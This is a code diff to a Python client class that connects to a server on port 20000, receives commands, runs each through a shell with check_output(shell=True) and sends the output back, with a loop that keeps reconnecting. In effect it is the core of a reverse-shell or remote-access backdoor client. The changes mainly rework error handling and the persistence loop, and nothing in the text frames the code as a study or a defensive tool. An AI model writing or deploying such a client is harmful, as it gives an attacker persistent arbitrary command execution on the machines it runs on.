@@ -14,10 +14,10 @@ class Socket:
         try:
             self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.active_socket.connect((socket.gethostname(), 20000))
-            Socket.established = True
+            self.established = True
             print("Connection established")
         except (ConnectionRefusedError, TimeoutError, socket.error):
-            Socket.established = False
+            self.established = False
             print("No connection established!")
 
     def receive_command(self):
@@ -25,7 +25,7 @@ class Socket:
             cmd = self.active_socket.recv(1024)
         except (ConnectionResetError, ConnectionRefusedError, TimeoutError, socket.error):
             self.established = False
-            return False
+            return
 
         cmd = cmd.decode()
 
@@ -52,18 +52,21 @@ class Socket:
         else:
             try:
                 output = check_output(cmd, shell=True)
+                output = ''.join(chr(i) for i in output)
             except CalledProcessError as error:
-                self.send_msg(error)
-                return False
-            output = ''.join(chr(i) for i in output)
-            self.send_msg(output)
-            return True
+                output = error
+            try:
+                self.send_msg(output)
+            except(ConnectionResetError, ConnectionAbortedError, OSError):
+                self.established = False
+                return
 
     def send_msg(self, msg):
         try:
             msg = dumps(msg)
             msg = bytes(f"{len(msg):{self.header}}", "utf-8") + msg
             self.active_socket.send(msg)
+            self.established = True
         except(ConnectionResetError, ConnectionAbortedError, OSError):
             self.established = False
 
@@ -113,6 +116,5 @@ connection = Socket()
 while True:
     if not connection.established:
         connection.connect_to_server()
-        continue
-    while connection.receive_command():
-        pass
+    while connection.established:
+        connection.receive_command()
